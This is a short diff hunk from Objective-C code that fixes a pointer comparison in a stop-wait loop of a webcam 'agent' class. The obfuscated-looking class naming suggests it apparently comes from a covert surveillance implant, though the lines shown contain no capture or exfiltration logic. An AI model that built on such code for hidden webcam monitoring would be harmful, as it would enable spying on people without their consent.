@@ -518,7 +518,7 @@ static __m_MAgentWebcam *sharedAgentWebcam = nil;
   
   [mAgentConfiguration setObject: AGENT_STOP forKey: @"status"];
   
-  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED &&
+  while (![[mAgentConfiguration objectForKey: @"status"] isEqualToString:AGENT_STOPPED] &&
          internalCounter <= MAX_STOP_WAIT_TIME)
   {
     internalCounter++;
